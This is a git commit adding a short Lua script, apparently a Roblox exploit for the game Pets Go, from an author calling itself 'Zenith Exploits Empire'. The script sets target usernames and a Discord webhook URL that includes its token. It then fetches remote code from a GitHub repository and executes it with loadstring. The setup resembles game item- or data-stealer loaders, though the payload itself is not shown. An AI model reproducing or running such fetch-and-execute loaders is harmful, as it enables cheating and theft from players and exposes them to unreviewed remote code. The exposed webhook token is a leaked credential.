a04ff2772e51b3fd965cd2eecfd589c5b0391604
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-30 15:58:07 +0200

    Add new script

---
+++ pets go/elite.lua
@@ -0,0 +1,5 @@
+Username = "test"
+Username2 = "test"
+Webhook = "https://discord.com/api/webhooks/1367137920959647784/Zk2EBFTnSlOExUw8MMYpDZCIkQmMDc4BVfzmfr3FGAOUly9ZIca8-6puMI3U1S9ZwBZC"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20pets%20go"))()
